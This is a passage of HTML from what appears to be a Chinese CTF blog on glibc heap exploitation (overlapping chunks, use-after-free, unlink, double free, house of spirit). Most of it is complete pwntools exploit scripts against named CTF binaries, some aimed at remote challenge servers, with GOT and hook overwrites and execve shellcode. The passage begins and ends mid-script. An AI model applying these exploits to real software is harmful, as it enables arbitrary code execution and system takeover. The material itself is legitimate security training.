class="built_in">hex</span>(sysbin))</span><br><span class="line">editbook(<span class="string">b&#x27;1&#x27;</span>,p64(free_hook))</span><br><span class="line">editbook(<span class="string">b&#x27;2&#x27;</span>,p64(sysbin))</span><br><span class="line">createbook(<span class="string">&quot;8&quot;</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>,<span class="string">&quot;8&quot;</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">deletebook(<span class="number">3</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="overslaping"><a href="#overslaping" class="headerlink" title="overslaping"></a>overslaping</h1><p><strong>和off-by-one有异曲同工之处，相同在，想方设法越权控制chunk字段，此方法就是将小chunk包含再大chunk之中，虽然我不能控制小chunk但是我可以控制大chunk进而控制小chunk，但是控制小chunk也是通过大chunk的某些字段实现，因此当更改小chunk某些字段之后，大chunk就失效了，因此只能利用一次，在一个地址处进行读写，此题是freegot</strong></p>
<p><strong>此题成功点在于fastbin的利用，fastbin的安全检查太少，链入链表只会检查和头是否重复，可以看出fastbin是一个用来攻击的破解点，需好好利用</strong></p>
<p><strong>此题的另一个重要漏洞是free参数的传递，其会直接传递用户指针，这样子参数就可控了</strong></p>
<p><strong>而想要控制大chunk包含小chunk需要溢出大chunk的size字段，使其可以包含小chunk</strong></p>
<p><strong>比较有意思的一点是假的chunk居然可以欺骗pwngdb，由此可以估计出pwngdb的实现就是通过简单的观察heap的相应字段实现的，哈哈哈哈</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./heapcreator&quot;</span>)</span><br><span class="line">pro = ELF(<span class="string">&quot;./heapcreator&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/home/l/how2heap/glibc-all-in-one/libs/2.21-0ubuntu4.3_amd64/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    to create a chunk</span></span><br><span class="line"><span class="string">    size:bytes</span></span><br><span class="line"><span class="string">    content:bytes</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,size)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param index: bytes(0 begin)</span></span><br><span class="line"><span class="string">    :param content: bytes</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index :&quot;</span>,index)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Content of heap : &quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index :&quot;</span>,index)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Size : &quot;</span>)</span><br><span class="line">    size = <span class="built_in">int</span>(io.recvline().strip())</span><br><span class="line">    <span class="built_in">print</span>(size)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Content : &quot;</span>)</span><br><span class="line">    content = io.recvline().strip()</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br><span class="line">    <span class="keyword">return</span> size,content</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index :&quot;</span>,index)</span><br><span class="line"></span><br><span class="line">create(<span class="string">b&#x27;152&#x27;</span>,<span class="number">144</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x90</span>))</span><br><span class="line">create(<span class="string">b&#x27;24&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;c&#x27;</span>+p64(<span class="number">0x21</span>))</span><br><span class="line">create(<span class="string">b&#x27;10&#x27;</span>,<span class="number">10</span>*<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">edit(<span class="string">b&#x27;0&#x27;</span>,<span class="string">b&quot;/bin/sh\x00&quot;</span>+p64(<span class="number">0x91</span>)+<span class="number">128</span>*<span class="string">b&#x27;b&#x27;</span>+p64(<span class="number">0x90</span>)+<span class="string">b&#x27;\x71&#x27;</span>)</span><br><span class="line">delete(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">freegot = pro.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(freegot))</span><br><span class="line"></span><br><span class="line">create(<span class="string">b&#x27;104&#x27;</span>,<span class="number">24</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0x70</span>)+p64(freegot)+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">size,content = show(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">freeadd = u64(content.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(size,<span class="built_in">hex</span>(freeadd))</span><br><span class="line">base = freeadd - elf.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">sysadd = elf.symbols[<span class="string">&#x27;system&#x27;</span>]+base</span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>,p64(sysadd))</span><br><span class="line">delete(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment">#create(b&#x27;10&#x27;,10*b&#x27;c&#x27;)</span></span><br></pre></td></tr></table></figure>

<h1 id="uaf"><a href="#uaf" class="headerlink" title="uaf"></a>uaf</h1><p><strong>和前两者思路差不多基本上就是超越权限的指针访问，当指针free掉但是没有释放，那么低权限的用户再次使用可以更改高权限用户的数据，接着利用高权限的野指针可以访问到想访问到的东西</strong></p>
<p><strong>此题是hacknote，是一道教学题比较基础</strong></p>
<p><strong>py代码如下</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = remote(&quot;node5.buuoj.cn&quot;,29954)</span></span><br><span class="line">io = process(<span class="string">&quot;hacknote&quot;</span>)</span><br><span class="line">pro = ELF(<span class="string">&quot;./hacknote&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    to create a chunk</span></span><br><span class="line"><span class="string">    size:bytes</span></span><br><span class="line"><span class="string">    content:bytes</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Note size :&quot;</span>,size)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Content :&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index :&quot;</span>,index)</span><br><span class="line">    content = io.recvline().strip()</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br><span class="line">    <span class="keyword">return</span> size,content</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index :&quot;</span>,index)</span><br><span class="line">create(<span class="string">b&#x27;32&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;32&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;32&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">delete(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">delete(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line">create(<span class="string">b&#x27;12&#x27;</span>,p32(magic))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">show(<span class="string">b&#x27;0&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h1><p>比较基础，原理不过多赘述，就是绕过指针检查，使chunk指针指向chunk地址的地址处，进而修改chunk的时候可以修改chunk指针达到任意地址写的目的，需要知道chunk指针的存储地址，也需要比较多的溢出量，以至于可以修改下一个chunk的prevsize字段和size字段。附上一道题目的py，<a href="https://buuoj.cn/challenges#hitcon2014_stkof">BUUCTF在线评测 (buuoj.cn)</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./stkof&quot;</span>)</span><br><span class="line">context.log_level =<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26354</span>)</span><br><span class="line">elfp = ELF(<span class="string">&quot;./stkof&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendline(size)</span><br><span class="line">    io.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendline(index)</span><br><span class="line">    io.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendline(index)</span><br><span class="line">    io.sendline(size)</span><br><span class="line">    io.send(content)</span><br><span class="line">    io.recv()</span><br><span class="line"></span><br><span class="line">num1 = create(<span class="string">b&#x27;10&#x27;</span>)</span><br><span class="line">num2 = create(<span class="string">b&#x27;280&#x27;</span>)</span><br><span class="line"></span><br><span class="line">num3 = create(<span class="string">b&#x27;280&#x27;</span>)</span><br><span class="line">fd = <span class="number">0x602150</span>-<span class="number">0x18</span></span><br><span class="line">bk = <span class="number">0x602150</span>-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line">edit(<span class="string">b&#x27;2&#x27;</span>,<span class="string">b&#x27;288&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x111</span>)+p64(fd)+p64(bk)+<span class="number">0xf0</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x110</span>)+p64(<span class="number">0x120</span>))</span><br><span class="line">de(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">putplt = elfp.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">putgot = elfp.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">freeplt = elfp.plt[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">atoiplt = elfp.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">freegot = elfp.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(putgot))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(freeplt))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(atoiplt))</span><br><span class="line">edit(<span class="string">b&#x27;2&#x27;</span>,<span class="string">b&#x27;112&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;a&#x27;</span>+p64(putgot)+p64(freegot)+p64(<span class="number">0x602158</span>)+<span class="number">5</span>*(<span class="string">b&#x27;cat ./flag&#x27;</span>+<span class="number">6</span>*<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,p64(putplt))</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">putadd = u64(io.recv()[<span class="number">0</span>:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_puts = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">base = putadd - libc_puts</span><br><span class="line">system = base +libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,p64(system))</span><br><span class="line">io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"><span class="comment">#io.sendline(&quot;cat flag&quot;)</span></span><br><span class="line">io.recv()</span><br><span class="line">sleep(<span class="number">5</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#io.recv()</span></span><br></pre></td></tr></table></figure>

<h1 id="double-free"><a href="#double-free" class="headerlink" title="double_free"></a>double_free</h1><p>注意一系列的检查吧，搞笑的是检查size的时候居然只看低4字节，因此可以通过hex表找可以伪造堆块的位置，其余的便没了。基本思想就是可以控制free掉的堆块进而改变fd指针，进而可以malloc的任意位置，以ISCC218–Write Some Paper为例，还有比较重要的是，低版本的堆fasbin没有地址对齐检查，否则就不好利用了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">myelf = ELF(<span class="string">&quot;./paper&quot;</span>)</span><br><span class="line">io =process(<span class="string">&quot;./paper&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;2 delete paper\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Input the index you want to store(0-9):&quot;</span>,index)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;How long you will enter:&quot;</span>,size)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;please enter your content:&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;2 delete paper\n&quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;which paper you want to delete,please enter it&#x27;s index(0-9):&quot;</span>,index)</span><br><span class="line">create(<span class="string">b&#x27;0&#x27;</span>,<span class="string">b&#x27;56&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;56&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;2&#x27;</span>,<span class="string">b&#x27;56&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">de(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">de(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">de(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">mallocadd = <span class="number">0x0000000000602032</span></span><br><span class="line">sysadd = <span class="number">0x0000000000400943</span></span><br><span class="line">create(<span class="string">b&#x27;3&#x27;</span>,<span class="string">b&#x27;56&#x27;</span>,p64(mallocadd))</span><br><span class="line">create(<span class="string">b&#x27;4&#x27;</span>,<span class="string">b&#x27;56&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;5&#x27;</span>,<span class="string">b&#x27;56&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;d&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;6&#x27;</span>,<span class="string">b&#x27;56&#x27;</span>,<span class="number">22</span>*<span class="string">b&#x27;a&#x27;</span>+p64(sysadd))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;2 delete paper\n&quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h1><blockquote>
<p>以<a href="https://buuoj.cn/challenges#lctf2016_pwn200">lctf2016_pwn200</a>为例子</p>
</blockquote>
<h2 id="fastbin绕过思路"><a href="#fastbin绕过思路" class="headerlink" title="fastbin绕过思路"></a>fastbin绕过思路</h2><ul>
<li>chunk地址对齐，此题对应的libc貌似不用考虑，没有试过。</li>
<li>size对齐（一般以2*size_t）</li>
<li>next_size检查，本题目主要检查尺寸范围</li>
<li>具体libc具体分析，可以查看malloc.c的源码</li>
</ul>
<blockquote>
<p>此处以glibc2.35为例</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp;</span><br><span class="line">      victim = *fb;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (victim))) <span class="comment">//地址对齐检查，低版本好像没有</span></span><br><span class="line">	    malloc_printerr (<span class="string">&quot;malloc(): unaligned fastbin chunk detected 2&quot;</span>);</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">	    *fb = REVEAL_PTR (victim-&gt;fd);</span><br><span class="line">	  <span class="keyword">else</span></span><br><span class="line">	    REMOVE_FB (fb, pp, victim);</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="type">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">	      <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">		malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);<span class="comment">//chunksize检查</span></span><br><span class="line">	      check_remalloced_chunk (av, victim, nb);<span class="comment">//debug模式调试所用，不用关心</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">	      <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">		 stash them in the tcache.  */</span></span><br><span class="line">	      <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">		&#123;</span><br><span class="line">		  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">		  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">		  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">			 &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      <span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (tc_victim)))</span><br><span class="line">			malloc_printerr (<span class="string">&quot;malloc(): unaligned fastbin chunk detected 3&quot;</span>);</span><br><span class="line">		      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">			*fb = REVEAL_PTR (tc_victim-&gt;fd);</span><br><span class="line">		      <span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">			  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">			  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">			    <span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">		    &#125;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	      <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">	      alloc_perturb (p, bytes);</span><br><span class="line">	      <span class="keyword">return</span> p;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h2 id="本题思路"><a href="#本题思路" class="headerlink" title="本题思路"></a>本题思路</h2><blockquote>
<p>1.利用printf的基址泄露rbp的值。</p>
<p>2.利用栈溢出来覆盖ptr的值（覆盖为rbp相关），可以利用此条件构造一个malloc_chunk（大尺寸），然后free掉再malloc达到可以更改rbp所指向的位置附近的值。而又因为rbp的bp-chain的性质，即可更改返回地址。</p>
<p>3.将返回地址更改为步骤2注入的shellcode的地址。因为步骤2可利用的空间有限，shellcode手写较好，不宜过长。</p>
<p>4.其中还有一些细节，如利用id来构造下一个chunk的size字段，绕过检查。</p>
</blockquote>
<h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io= process(&quot;./pwn200&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27077</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">## 泄露地址</span></span><br><span class="line">io.sendafter(<span class="string">&quot;who are u?\n&quot;</span>,<span class="number">48</span>*<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">rbp = u64(io.recvuntil(<span class="string">b&quot;,&quot;</span>)[<span class="number">48</span>:<span class="number">48</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;rbp con:&quot;</span>,<span class="built_in">hex</span>(rbp))</span><br><span class="line">io.recv()</span><br><span class="line"><span class="comment">## 构造id字段，利用atoi，33会被转化为0x21</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;33&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 手写shellcode，push，pop所占机器码较少</span></span><br><span class="line">binpa = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax,0x68732f6e69622f</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">mov rax,59</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;asm len:&quot;</span>,<span class="built_in">len</span>(binpa))</span><br><span class="line"><span class="comment">##溢出字段的构造</span></span><br><span class="line">payload = <span class="number">8</span>*<span class="string">b&#x27;\x00&#x27;</span>+binpa+<span class="number">4</span>*<span class="string">b&#x27;\x00&#x27;</span>+p64(<span class="number">0x41</span>)+<span class="number">0x8</span>*<span class="string">b&#x27;a&#x27;</span>+p64(rbp-<span class="number">176</span>+<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&#x27;give me money~\n&#x27;</span>,payload)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;your choice : &quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;your choice : &quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;how long?\n&quot;</span>,<span class="string">b&#x27;56&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.send(<span class="number">24</span>*<span class="string">b&#x27;a&#x27;</span>+p64(rbp-<span class="number">176</span>-<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="house-of-spirit（Arbitrary-Alloc）"><a href="#house-of-spirit（Arbitrary-Alloc）" class="headerlink" title="house_of_spirit（Arbitrary Alloc）"></a>house_of_spirit（<strong>Arbitrary Alloc</strong>）</h1><blockquote>
<p>以<a href="https://buuoj.cn/challenges#babyheap_0ctf_2017">BUUCTF在线评测 (buuoj.cn)</a>为例</p>
</blockquote>
<h2 id="本题思路-1"><a href="#本题思路-1" class="headerlink" title="本题思路"></a>本题思路</h2><ul>
<li>通过unsortedbin的双向链表泄露main_arena地址，得到libc基址，再通过将malloc_hook中注入onegadget拿到shell</li>
<li>此题有明显溢出，因此可以考虑吧overslap，凭着这个思路可以泄露address</li>
<li>通过复写fd，来达到任意地址写的目的，以此来注入onegadget</li>
</ul>
<h2 id="本题py-远程打不通，可以打通本地，搞不懂为什么"><a href="#本题py-远程打不通，可以打通本地，搞不懂为什么" class="headerlink" title="本题py(远程打不通，可以打通本地，搞不懂为什么)"></a>本题py(远程打不通，可以打通本地，搞不懂为什么)</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io= process(&quot;./pwn200&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27077</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">io.sendafter(<span class="string">&quot;who are u?\n&quot;</span>,<span class="number">48</span>*<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">rbp = u64(io.recvuntil(<span class="string">b&quot;,&quot;</span>)[<span class="number">48</span>:<span class="number">48</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;rbp con:&quot;</span>,<span class="built_in">hex</span>(rbp))</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;33&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">binpa = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax,0x68732f6e69622f</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">mov rax,59</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, 